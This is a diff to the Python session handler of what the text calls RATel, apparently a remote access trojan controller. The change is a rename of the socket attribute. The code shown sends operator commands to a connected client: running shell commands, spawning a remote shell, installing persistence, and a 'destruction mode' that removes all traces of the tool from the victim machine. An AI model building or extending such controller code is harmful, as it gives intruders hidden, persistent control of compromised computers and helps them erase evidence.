@@ -25,7 +25,7 @@ class Session:
     #This class is called when the target is selected.
    # sesssion = True
     def __init__(self,socket,ip_client,port_client,session_nb):
-        self.socket = socket
+        self.sock = socket
         self.ip_client = ip_client
         self.port_client = port_client 
         self.session_nb = session_nb
@@ -68,10 +68,11 @@ class Session:
 
             else:
                 cmd += char
-       
-        if(CheckConn().sendsafe(self.session_nb, self.socket, cmd)): #send data
+    
+    
+        if(CheckConn().sendsafe(self.session_nb, self.sock, cmd)): #send data
         
-            CheckConn().recvcommand(self.socket,4096) #XOR  The decryption of xor is automatic on this method.
+            CheckConn().recvcommand(self.sock,4096) #XOR  The decryption of xor is automatic on this method.
             
         else:
             printColor("error","\n[-] An error occurred while sending the command.\n")
@@ -83,8 +84,8 @@ class Session:
 
         printColor("information","\n[?] Execute -b or --back or exit to return to sessions mode.\n\n") 
         
-        if(CheckConn().sendsafe(self.session_nb, self.socket, "MOD_SPAWN_SHELL:"+prog) ):
-            FakeCmd(self.socket).main() #Run cmd
+        if(CheckConn().sendsafe(self.session_nb, self.sock, "MOD_SPAWN_SHELL:"+prog) ):
+            FakeCmd(self.sock).main() #Run cmd
         
         else:
             printColor("error","\n[-] An error occurred while sending the command.\n")
@@ -94,10 +95,10 @@ class Session:
         '''-p or --persistence'''
         #if Handler.dict_conn[self.session_nb][NB_ALIVE]:  #test is life
         mod_persi = "MOD_PERSISTENCE:default"
-        if(CheckConn().sendsafe(self.session_nb, self.socket, mod_persi)): #send mod persi
+        if(CheckConn().sendsafe(self.session_nb, self.sock, mod_persi)): #send mod persi
             #printColor("information","[+] the persistence mod was sent.\n")
             
-            reponse = CheckConn().recvsafe(self.socket,4096)
+            reponse = CheckConn().recvsafe(self.sock,4096)
             if(reponse == "\r\n"):#Mod persi ok  
                 printColor("successfully","\n[+] the persistence mod is well executed with success..\n")
             else:
@@ -114,9 +115,9 @@ class Session:
         printColor("information","\n[!] Are you sure you want to run the destruction mode on the client ? Once the destruction mode is launched the client removes all traces of RATel. This means that if you have several clients on the same machine they will all be deleted and therefore they will no longer be accessible.\nIf you are sure of your choice enter Y if not enter N.\n")
         if(areYouSure()):
             mod_destruction  = "MOD_DESTRUCTION:default"
-            if(CheckConn().sendsafe(self.session_nb, self.socket, mod_destruction)):
+            if(CheckConn().sendsafe(self.session_nb, self.sock, mod_destruction)):
                 
-                reponse = CheckConn().recvsafe(self.socket, 4096).split(SPLIT)
+                reponse = CheckConn().recvsafe(self.sock, 4096).split(SPLIT)
                 
                 if(reponse[1] == "True" ): 
                 
